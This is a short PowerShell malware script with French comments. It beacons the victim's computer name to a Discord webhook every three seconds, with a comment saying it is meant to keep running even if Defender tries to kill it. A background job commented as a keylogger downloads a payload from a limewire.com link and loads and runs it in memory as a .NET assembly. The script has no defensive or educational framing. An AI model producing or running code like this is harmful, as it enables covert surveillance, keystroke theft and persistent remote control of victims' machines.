$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Ping toutes les 3 sec pour toujours (même si Defender essaie de tuer)
while ($true) {
    try {
        iwr $webhook -Method Post -Body (@{content="PING ALIVE – $env:COMPUTERNAME – $(Get-Date -Format 'HH:mm:ss')"} | ConvertTo-Json) -ContentType 'application/json' -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Seconds 3
}

# Ton keylogger en fond (il tourne même si le ping continue)
Start-Job -ScriptBlock {
    $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
    $asm = [Reflection.Assembly]::Load($bytes)
    $asm.EntryPoint.Invoke($null,$null)
}
